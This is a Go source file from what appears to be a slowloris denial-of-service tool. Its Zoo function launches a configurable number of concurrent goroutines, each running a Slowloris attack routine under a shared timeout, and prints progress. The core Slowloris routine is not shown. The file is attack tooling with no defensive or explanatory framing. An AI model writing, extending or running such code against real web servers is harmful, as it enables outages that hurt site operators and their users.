package slowloris

import (
	"context"
	"fmt"
	"os"
	"sync"
)

// Zoo performs a distributed slowloris attack based on the given parameters
func Zoo(o Options) error {
	ctx, cancel := context.WithTimeout(context.Background(), o.Timeout)

	wg := sync.WaitGroup{}
	for i := int64(0); i < o.Count; i++ {
		wg.Add(1)
		go func(index int64) {
			defer wg.Done()
			fmt.Printf("\rslowloris %d", index)
			if err := Slowloris(ctx, index, o); err != nil {
				fmt.Printf("slowloris %d received err: %s\n", index, err)
				return
			}
			os.Stdout.Sync()
		}(i)
	}

	wg.Wait()
	cancel()
	return nil
}
